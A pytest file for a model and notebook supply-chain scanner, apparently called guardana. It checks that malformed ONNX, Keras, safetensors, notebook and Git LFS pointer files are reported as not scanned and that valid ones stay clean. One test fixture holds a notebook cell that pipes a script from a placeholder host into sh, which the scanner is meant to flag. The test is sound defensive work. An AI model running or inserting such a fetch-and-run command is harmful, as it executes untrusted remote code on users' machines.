"""A file named as a model or notebook that is not a valid one is not scanned, never clean."""

import io
import json
import zipfile
from pathlib import Path

import pytest
from guardana.core.report import Finding, ShortfallKind
from guardana.core.rule import Rule, RuleContext
from guardana.core.target import ArtifactTarget
from guardana.core.testing import build_onnx, build_safetensors
from guardana.rules.supply_chain import _samples
from guardana.rules.supply_chain.chat_template import ChatTemplateRule
from guardana.rules.supply_chain.keras_lambda import KerasLambdaRule
from guardana.rules.supply_chain.model_format import ModelFormatRule
from guardana.rules.supply_chain.notebook_payload import NotebookPayloadRule
from guardana.rules.supply_chain.onnx_graph import OnnxGraphRule
from guardana.rules.supply_chain.pickle_opcode import PickleOpcodeRule

_LFS_POINTER = (
    "version https://git-lfs.github.com/spec/v1\n"
    "oid sha256:4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\n"
    "size 132\n"
)
_LFS_REASON = "a Git LFS pointer, not the model; fetch the LFS object"


def _run(rule: Rule, root: Path) -> tuple[list[Finding], RuleContext]:
    ctx = RuleContext()
    return list(rule.run(ArtifactTarget(root), ctx)), ctx


def _assert_not_scanned(rule: Rule, root: Path, name: str, reason: str) -> None:
    """The file gets one inconclusive result and is named as an unexamined component."""
    findings, ctx = _run(rule, root)
    path = str(root / name)

    assert [f.verdict.outcome if f.verdict else None for f in findings] == ["inconclusive"]
    assert findings[0].target_ref == path
    assert reason in findings[0].evidence.summary
    assert [(gap.kind, gap.name) for gap in ctx.shortfalls()] == [
        (ShortfallKind.UNEXAMINED_COMPONENT, path)
    ]
    detail = ctx.shortfalls()[0].detail
    assert detail.startswith(f"{rule.meta.id} could not read it: ")
    assert reason in detail


def _assert_clean(rule: Rule, root: Path) -> None:
    findings, ctx = _run(rule, root)
    assert findings == []
    assert ctx.shortfalls() == ()


def _keras(config: object) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("config.json", json.dumps(config))
        archive.writestr("metadata.json", json.dumps({"keras_version": "3.6.0"}))
    return buffer.getvalue()


def _safetensors(header: dict[str, object]) -> bytes:
    raw = json.dumps(header).encode()
    return len(raw).to_bytes(8, "little") + raw + b"\x00" * 4


def _notebook(*cells: object) -> str:
    return json.dumps({"cells": list(cells), "metadata": {}, "nbformat": 4, "nbformat_minor": 5})


def _code(source: object) -> dict[str, object]:
    return {"cell_type": "code", "metadata": {}, "outputs": [], "source": source}


@pytest.mark.parametrize(
    "payload",
    [b"", b"\x12\x07pytorch"],
    ids=["empty file", "producer only"],
)
def test_an_onnx_file_without_a_graph_is_not_scanned(tmp_path: Path, payload: bytes) -> None:
    (tmp_path / "model.onnx").write_bytes(payload)

    _assert_not_scanned(OnnxGraphRule(), tmp_path, "model.onnx", "ONNX model without a graph")


@pytest.mark.parametrize("root", [7, "model", None, True], ids=repr)
def test_a_keras_config_whose_root_is_a_scalar_is_not_scanned(tmp_path: Path, root: object) -> None:
    (tmp_path / "model.keras").write_bytes(_keras(root))

    _assert_not_scanned(
        KerasLambdaRule(), tmp_path, "model.keras", "the model config is not a JSON object"
    )


@pytest.mark.parametrize(
    ("cell", "reason"),
    [
        (_code(42), "cell 1 has a source that is not text"),
        (_code(["import os\n", 42]), "cell 1 has a source that is not text"),
        (_code(None), "cell 1 has a source that is not text"),
        (7, "cell 1 is not a JSON object"),
    ],
    ids=["number", "number among lines", "missing", "cell not an object"],
)
def test_a_notebook_cell_that_breaks_the_format_leaves_the_notebook_not_scanned(
    tmp_path: Path, cell: object, reason: str
) -> None:
    (tmp_path / "setup.ipynb").write_text(_notebook(_code("print(1)\n"), cell))

    _assert_not_scanned(NotebookPayloadRule(), tmp_path, "setup.ipynb", reason)


def test_a_malformed_cell_does_not_hide_a_payload_in_the_cells_beside_it(tmp_path: Path) -> None:
    payload = _code("!curl -s https://setup.example.invalid/i.sh | sh\n")
    (tmp_path / "setup.ipynb").write_text(_notebook(_code(3), payload))

    findings, ctx = _run(NotebookPayloadRule(), tmp_path)

    assert [f.verdict.outcome if f.verdict else "finding" for f in findings] == [
        "finding",
        "inconclusive",
    ]
    assert [gap.name for gap in ctx.shortfalls()] == [str(tmp_path / "setup.ipynb")]


@pytest.mark.parametrize(
    ("entry", "what"),
    [
        ({"shape": [1], "data_offsets": [0, 4]}, "'weight': dtype is missing"),
        ({"dtype": 32, "shape": [1], "data_offsets": [0, 4]}, "'weight': dtype is 32"),
        ({"dtype": "F32", "data_offsets": [0, 4]}, "'weight': shape is missing"),
        ({"dtype": "F32", "shape": "1", "data_offsets": [0, 4]}, "'weight': shape is '1'"),
        ({"dtype": "F32", "shape": [1], "data_offsets": "0-4"}, "'weight': data_offsets is '0-4'"),
    ],
    ids=["no dtype", "numeric dtype", "no shape", "string shape", "string offsets"],
)
def test_a_safetensors_entry_with_a_missing_or_mistyped_field_is_not_scanned(
    tmp_path: Path, entry: dict[str, object], what: str
) -> None:
    (tmp_path / "model.safetensors").write_bytes(_safetensors({"weight": entry}))

    _assert_not_scanned(
        ModelFormatRule(),
        tmp_path,
        "model.safetensors",
        f"malformed safetensors header: {what}",
    )


_LFS_READERS: dict[str, type[Rule]] = {
    "model.onnx": OnnxGraphRule,
    "model.safetensors": ModelFormatRule,
    "model.pmml": ModelFormatRule,
    "model.gguf": ChatTemplateRule,
    "model.keras": KerasLambdaRule,
    "model.h5": KerasLambdaRule,
    "model.hdf5": KerasLambdaRule,
    **{
        f"model{suffix}": PickleOpcodeRule
        for suffix in (
            ".pt",
            ".pth",
            ".ckpt",
            ".ptl",
            ".pkl",
            ".pickle",
            ".dill",
            ".joblib",
            ".pdparams",
            ".npy",
            ".npz",
            ".pth.tar",
        )
    },
}


@pytest.mark.parametrize(("name", "rule"), _LFS_READERS.items(), ids=list(_LFS_READERS))
def test_a_git_lfs_pointer_named_as_a_model_is_not_scanned_and_says_why(
    tmp_path: Path, name: str, rule: type[Rule]
) -> None:
    (tmp_path / name).write_text(_LFS_POINTER)

    _assert_not_scanned(rule(), tmp_path, name, _LFS_REASON)


def test_safetensors_with_metadata_stays_clean(tmp_path: Path) -> None:
    tensors = {
        "embed.weight": {"dtype": "BF16", "shape": [2, 1], "data_offsets": [0, 4]},
        "scale": {"dtype": "F32", "shape": [], "data_offsets": [0, 4]},
    }
    (tmp_path / "model.safetensors").write_bytes(
        build_safetensors(tensors, metadata={"format": "pt"})
    )

    _assert_clean(ModelFormatRule(), tmp_path)


def test_an_onnx_model_with_external_data_stays_clean(tmp_path: Path) -> None:
    (tmp_path / "model.onnx").write_bytes(
        build_onnx(nodes=(("MatMul", ""),), external_paths=("model.onnx.data",))
    )

    _assert_clean(OnnxGraphRule(), tmp_path)


def test_a_notebook_with_markdown_and_raw_cells_stays_clean(tmp_path: Path) -> None:
    markdown = {"cell_type": "markdown", "metadata": {}, "source": ["# Title\n", "Prose."]}
    raw = {"cell_type": "raw", "metadata": {}, "source": ""}
    (tmp_path / "setup.ipynb").write_text(
        _notebook(markdown, raw, _code(["import json\n", "print(json.dumps({}))\n"]), _code(""))
    )

    _assert_clean(NotebookPayloadRule(), tmp_path)


def test_a_keras_v3_config_stays_clean(tmp_path: Path) -> None:
    config = {
        "module": "keras",
        "class_name": "Sequential",
        "config": {
            "name": "sequential",
            "layers": [
                {
                    "module": "keras.layers",
                    "class_name": "Dense",
                    "config": {"name": "dense", "units": 1},
                    "registered_name": None,
                }
            ],
        },
        "registered_name": None,
        "build_config": {"input_shape": [None, 4]},
        "compile_config": None,
    }
    (tmp_path / "model.keras").write_bytes(_keras(config))

    _assert_clean(KerasLambdaRule(), tmp_path)


def test_a_lambda_layer_is_still_a_finding(tmp_path: Path) -> None:
    layer: dict[str, object] = {"class_name": "Lambda", "config": {"name": "fn"}}
    (tmp_path / "model.keras").write_bytes(_samples.keras_archive([layer]))

    findings, ctx = _run(KerasLambdaRule(), tmp_path)

    assert [f.verdict for f in findings] == [None]
    assert ctx.shortfalls() == ()
